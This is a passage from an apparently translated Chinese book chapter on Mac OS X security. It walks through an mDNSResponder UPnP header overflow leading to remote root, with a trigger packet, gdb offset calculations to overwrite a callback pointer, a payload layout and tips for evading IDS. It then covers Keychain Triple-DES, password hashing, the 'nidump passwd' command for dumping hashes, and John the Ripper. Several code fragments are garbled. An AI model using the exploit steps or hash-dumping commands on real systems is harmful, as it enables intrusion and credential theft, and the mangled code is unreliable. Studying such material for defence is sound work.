
```
*err = ENOMEM;
  return -1;
}
mdata = gbufuf_cont(mdata);
MLCGET(mdata, M_WAIT);
if (!mdata->m_flags & M_EXT) {
  m_free(m);
  file_drop(fd);
  return(NULL);
}
dataptr = mtod(mdata, caddr_t);
space = MCBLYTES;
```

（见 <http://projects.info-pull.com/moab/MOAB-14-01-2007.html>）。

# Scarlet 中的 MDNSResponder

如果说有什么软件供应商应该害怕，那一定是“远程根（remote root）”这两个词的组合。这意味着外部人员将能够在任何远程访问的系统上获得最高管理权限。

在讨论这个问题之前，我们必须先解释 MDNS 是所需的功能。在过去，人们没有办法以自动的方式让机器之间相互操作，例如以即插即用的方式与不同设备通信。他们必须手动输入网络地址和其他配置细节才能使用远程打印机。

为了进一步说明：

- 为了实现自动化，你需要广播广告。
- 机器应该监听并处理来自若干个不同网络主机的多个不同广告。这需要一个具有相应权限的守护进程来处理由这些消息设置的功能集。我们将这些消息及其格式命名为通信协议，即多播 DNS (MDNS)。
- 这样的守护进程能够开启服务以及这些服务所依赖的其他实用程序。想想网络打印（例如 `CUPS`），它可能需要 `Samba` 来与基于 Microsoft Windows 的主机协作）。
- AppleTalk 栈又是怎样的？

在 Mac OS X 中，这项特殊功能（被称为“Bonjour”）由 `mDNSResponder` 提供，它在 Tiger 版本中以 root 权限运行，随后在 Leopard 版本中更改为使用特定用户。它包含了 MDNS 协议的实现、一些遗留的 NAT 转换（此处将对其审查，因为它包含了令人感到震惊的简单缺陷）以及 UPN 支持。

<https://developer.apple.com/networking/bonjour/faq.html.>

2006年2月，The Register 发表了一篇文章，讨论了在 Shmoacon 会期间安全人员 Raven Adler 的 Apple PowerBook 遭到入侵的情况。基本上是有人获得了管理权限（root 级），并将笔记本电脑变成了“warez”服务器。

<https://www.theregister.com/uk/2006/02/08/apple_vulnerability/.>

取证进行的事后分析确实显示，该主机声称其已经按照最佳实践建议对任何人所能做的“加固”。在安全行业这样一个狭小领域以及行业内部的子集中，秘密是稀缺的，我们通常处理的是“公开的秘密”。也就是说，那些永远不会被任何相关人员公开承认（此外，可能根本没有可靠的证据来支持此类承认），但仍然广为人知的信息。传闻称，有三方曾对 `mDNSResponder` 的源代码进行了详尽审计。

```c
typedef struct tagProperty {
  char       *pszName;
  char       *pszValue;
  char       *pszType;
} Property, *PProperty;

typedef struct tagHTTP {
  char       *pszStatus;
  char       *pszReason;
  int        iNumHeaders;
  Property aHeaders[30]; // 假设最多许多头部
  char       *pszBody;
  // 供管理员使用
  int        fFree;
  char       *buf;
} HTTPResponse, *PHTTPResponse, **PHTTPResponse;
```

关注该结构的定义，你会注意到 `iNumHeaders` 成员。在不了解 `mDNSResponder` 如何处理响应的情况下，我们无法理解它的目的，但让我们节省时间，直奔主题：一旦所有头部都处理完毕，这个数字将持有找到的头部的总数。问题在于，你不应该处理超过固定数量的头部。又是又是简单的溢出，只不过带有一点小转折。头部，30，这就是该漏洞存在的原因。他们将其作为引用，而它们最多只能容纳30个头部。所有写入或读取该结构的函数都会受到此问题的影响。一旦数字大于30，它将导致越界写入或读取。在前者，它可能会导致可以实现任意代码执行的可利用条件；而在后者（在此特定情况下），将导致 DoS（拒绝服务）状态。

```c
iNumHeaders = 0; // 初始化为 0 个头部
// 按行解析头部字段（当未到达头部结束）
while (!FEOH) {
  pPropertyHeader = &(pResponse->aHeaders[iNumHeaders]);
  // 将头部字段名称指向行的第一个字符
  pHeader->pszName = pszEOL;
  (代码跳过)
  pHeader->pszValue++; // 跳过空格
  iNumHeaders++;
  pHeader++; // 指向下一个头部
  pResponse->aHeaders
}
```

# 漏洞将通过类似这样的 UPNP 响应触发：

```
NOTIFY * HTTP/1.1
ST: urn:schemas-upnp-org:service:WANIPConnection:1
Location: http://192.168.0.13:1981/rootDesc.xml
USN: uuid:udp-InternetGatewayDevice-1.0-1234567890001::WANIPConnection
0: AAAAAAAAAAAAA
1: BBBBBBBBBBBBB
2: CCCCCCCCCCCC
3: DDDDDDDDDDDDDD
4: EEEEEEEEEEEEEE
...
30: AAAAAAAAAAAAAA
31: BBBBBBBBBBBBBB
32: CCCCCCCCCCCC
33: DDDDDDDDDDDDDDD
```

# 用 mdResponder 获取远程 Root 权限

该技术的功劳属于 Immunity 团队，他们为自己的 CANVAS 产品开发了该模块。只要你允许将 payload 放入单个 UDP 数据包中以避免分片，这种方法就非常简单。基本上，`mDNS` 数据结构中的一个函数指针（命名为 `Callback`）在约 21120 字节内是可达的，那么我们就能通过溢出 `g_szRouterHostPortDesc` 并使用约 21120 字节的缓冲区来覆盖它。

```gdb
(gdb) p g_szRouterHostPortDesc
$4 = (char (*)[10240]) 0x3dba0
(gdb) &mDNSStorage
$5 = (mDNS *) 0x41020
(gdb) 0x41020 - 0x3dba0
$6 = 21120
```

非常直接，不是吗？正如我们已经提到的，只要我们的 payload 落在单个 UDP 数据包中，我们就没问题。（这略微取决于平台；确保你了解我们操作系统的 UDP 实现）。我们的 payload 结构应该类似于：

```
[g_szRouterHostPortDesc][21120 bytes] [mDNSStorage][ptr]
at 0x3dba0........................................at 0x41020...***]
```

![](img/3f6a4a8b6ed1d4458658b001e0374e75_302_0.png)

# 第 7 章 • 安全与 OS X

使用随机字母数字填充有助于避免触发 IDS 签名和其他监控，但你可能可以在一个不受保护的局域网中使用此漏洞，其中自由的未受保护的 Mac OS 主机在漫游。因此，这不是一个极其困难的场景，我们不需要过多的规避。尽管如此，你应该让网络流量尽可能离散。

指针的使用在使用所示，以及它指向的原始函数。这是你偶尔能看到的奇妙事物之一，虽然存储函数指针并不是什么明智的编码实践，而且不仅仅是因为潜在的安全风险。

```gdb
(gdb) p mStorage->MainCallback
$12 = (mDNSCallback *) 0xc5fa <mDNS_StatusCallback
(gdb) list 3289
3289     if (m->MainCallback)
3290         m->MainCallback(m, mStatusConfigChanged);
3291     )
```

我们发送以触发问题的 HTTP 响应必须按照这种格式化：

```
NOTIFY * HTTP/1.1

ST: urn:schemas-upnp-org:service:WANIPConnection:1

Location: http://192.168.0.13:1981/rootDesc.xml

USN: uuid:udp-InternetGatewayDevice-1.0-1234567890001::WANIPConnection

0: AAAAAAAAAAAAA

1: BBBBBBBBBBBBB

2: CCCCCCCCCCCC

3: DDDDDDDDDDDDDD

4: EEEEEEEEEEEEEE

...

30: AAAAAAAAAAAAAA

31: BBBBBBBBBBBBBB

32: CCCCCCCCCCCC

33: DDDDDDDDDDDDD
```

# OS X 安全与加密：OS X 内部加密

## 系统钥匙串

钥匙串访问（Keychain Access）应用程序在 MacOS X 系统后台是一项相对冷门的技术。它存储了敏感且重复输入的信息和验证数据，以便在需要时自动提供。它减少了用户记忆许多不同密码的需求，消除了在其他地方制作副本的感知需求，并最终终结了那个经典的安全噩梦——贴满登录信息并粘在用户屏幕上的便利签。

钥匙串系统将信息存储在自己的安全数据库中，由于它被嵌入到 OS X 系统的基础中，它可以捕获并保留各种不同的数据。这通常包括（但不限于）电子邮件、网站和无线接入点的登录信息以及某些加密证书。为了安全起见，以某种方式对这些数据进行加密是非常重要的，而 Apple 为此选择的加密算法是三重数据加密标准（Triple-DES）。

在高级加密标准（AES）广泛采用之前不久，三重数据加密标准（DES）作为这种已被破解且完全过时的加密算法的短期继任者被引入。得益于商业专利的更新，它仍然被深度集成在安全套接层和传输层安全（SSL/TLS）协议中，这些协议用于 Web 流量的日常加密。

Triple-DES 本质上是对明文进行 DES 的三次递归应用。通过有效地将加密过程增加三倍，它极大地降低了那些破坏原始 DES 的攻击类型带来的风险，因此被某些机构认为安全得多。尽管如此，其他用户和评论人士仍然怀疑该算法存在其他未解决的弱点，导致近年来其声誉有所受损，在更新系统中的采用率也随之下降。

Triple-DES 的速度也比竞争算法慢得多。考虑到现代通信的速度需求（这些需求建立在快速高效地保护大量数据的基础上），许多系统从 Triple-DES 转向更快的算法，如 AES（其处理数据的速度几乎是 Blowfish 的七倍），这并不意外。Apple 在其钥匙串中采用 Triple-DES 标准可能追溯到 MacOS X 的早期版本，其目前的使用推测（且曾经确实）是因为在安装新版本 MacOS X 修订的迁移和升级阶段，有需要与旧系统保持兼容。

## 更好的钥匙串安全性

Apple 将钥匙串如此完整地集成到 OS X 的底层，以至于除非你特意更改用户账户的钥匙串密码，否则你不需要操作。这是安全需求与维护简单性之间平衡的良好示例。Apple 一直以生产直观、用户友好的系统闻名，做任何其他事情都将偏离公司的核心原则。反复请求输入密码可能会让许多用户感到困惑和恼，尤其是那些不理解或不特别关注安全的用户。

尽管如此，任何想要真正保护 OS X 系统的人，如果他们坚持使用钥匙串进行敏感数据存储，都应确保默认钥匙串密码与登录密码不同。用户还应该在编辑工具栏的“更改钥匙串设置”下激活“闲置 X 分钟后锁定钥匙串”和“睡眠时锁定”功能。是的，这将导致需要解锁时会有更多输入钥匙串密码的请求，但结果是一个更安全的系统。

在写作时，尚未发现公开的针对 Triple-DES 算法或锁定的系统钥匙串的完全实用的加密攻击，但如果攻击者足够幸运获得了某个未更改钥匙串密码的人的登录密码，他们仍然可以通过其他手段访问用户的钥匙串。

Apple 在 MacOS X 中提供了两套钥匙串：用于系统级任务的系统钥匙串，以及特定每个账户持有者的用户钥匙串。虽然每个钥匙串都是使用 Triple-DES 及其约 128 位密钥创建的，但 Triple-DES 本身的构建方式使其很难确定其真实大小，并可能将应用大小限制在有效的 112 位密钥上。具有安全意识的用户可能会认为这对关重要数据构成了不可接受的风险，并可能考虑使用支持更高规格算法的第三方替代方案。类似 `1Password` 这种钥匙串管理程序（<http://1password.com/>），它使用 Blowfish 算法和 128 位密钥，并在数据的加密存储中增加了额外的盐（Salt）保护，这可能是一个很好的起点。

# OS X 安全与加密：OS X 密码加密

MacOS X 从 2001 年诞生以来一直使用多种方法进行密码加密，并在 2005 年引入 MacOS X 10.4 Tiger 后，实现了与其他操作系统相一致的、通常被认为是体面的标准。然而，通往成功的道路并非帆风顺。下一节将探索 OS X 密码身份验证的发展历史，作为检查在当今世界安全存储标准登录密码所必需的多层安全方法的前言。

OS X 系统的大部分内容源于类似 UNIX 的系统中密码身份验证的标准化实现，这些系统在三十多年里没有发生太大变化。这些系统在存储密码时利用加密哈希函数，以防止密码被任何访问系统的人读取。

对 MacOS X 中采用的加密进行任何检查都要求对现代加密术语及其含义有基本的了解。以下这些指南将有助于：

## 对称加密

对称加密使用相同的密钥进行加密和解密。良好的例子包括：

- `DES`
- `Triple-DES`
- `Blowfish`
- `Twofish`
- `Serpent`
- `AES`

## 非对称加密

非对称加密使用一对密钥：公钥和私钥。这是通过交换公钥且不公开私钥实现的。示例算法包括：

- `Diffie-Hellman`
- `ElGamal`
- `Rivest, Shamir, Adleman (RSA)`
- 数字签名算法 (`DSA`)

## 哈希

哈希函数是单向数学过程，接受一个输入字符串并返回一个唯一的、固定长度的字符字符串。该结果被称为“哈希值”。哈希函数的强大之处在于其逆过程在计算上是不可行的，而且如果输入不同，每个哈希值应该是唯一的。哈希函数的示例包括：

- 安全哈希算法第一版 (`SHA-1`)
- 消息摘要算法 5 (`MD5`)
- `RIPEMD-160`
- `Whirlpool`

哈希可以满足现代操作系统的许多基本需求，包括检查数字数据完整性的需求，以及存储密码的需求。虽然哈希被认为仅仅是半安全的，但只要时间足够，暴力破解哈值是可能的（见下文），并且长期以来在基于 UNIX 的系统中一直承担这一角色，并在 OS X 的密码安全中同样处于核心。

在 OS 版本 10.0–10.2 中，Apple 使用一个名为 `NetInfo` 的数据库来存储和安排密码。这与大多数 UNIX 实现的不同之处在于，它源于开发 OS X 的 Next 软件架构，但仍然存在致命缺陷。由于 `NetInfo` 将密码直接存储在明文、未加密数据库中，简单的命令就足以获取其他用户的哈希值，这一功能缺陷很快被发现并被 `mSec.net` 和 `SecureMac.com` 等 Macintosh 安全网站的成员所关注。此涉及的命令如下：

```
$ nidump passwd
```

在系统上运行此命令的用户收到的结果中，系统中的每个用户都会包含一行类似于下面的内容：

```
jdoe:3dbn8YODE3LG.:501:501:0:0:jdoe:/Users/jdoe/jdoe:/bin/bash
```

## 密码破解

上述字符串包含哈希值，因此容易受到密码破解的威胁。破解是一种攻击方法，它通过将字典中的单个单词，或字母数字与特殊字符的随机排列与给定的哈希值进行对比，并寻找直接的关联。

哈希值的创建目的是为了保持唯一性，因此在破解过程中，如果生成的单词或字符串产生了相同的哈希，那么几乎可以确定密码已被破解。这种令人不安但有效的攻击类型通常被称为“暴力破解”或“字典”攻击，其耗时取决于可用的处理能力。这种漏洞在 UNIX 风格的系统中被密码破解程序经常利用，最著名的就是臭名昭著的 `John The Ripper` 程序。“John”（正如它常被称为那样）已移植到 MacOS X——包括原生支持以及通过 `Fink` 和 `MacPorts` 工具——并通常被认为是破解速度最快的工具。

密码破解被认为是准伦理的，但对于普通（或少见的？）安全管理员来说是必不可少的工具。在高手手中，它们通过在入侵者之前发现弱密码来保护系统；但在错误的人手中，它们可能成为针对防御已经削弱的系统的强大额外武器。事实上，它们是经典的双刃剑，但通过对多用户系统上的密码进行定期行政审计，它们确实具有促进现代加密中良好安全实践的巨大潜力。

## 影子与 DES

影子密码在大多数 UNIX 系统中常见，它可以防止除 root 用户之外的任何人查看哈希值。但 Apple 在早期的操作系统中并没有使用它们。相反，Apple 发布了 OS 10.2（2002年），使用了基于已失效的数据加密标准（DES）的 UNIX `crypt(3)` 库中的可访问哈希值。
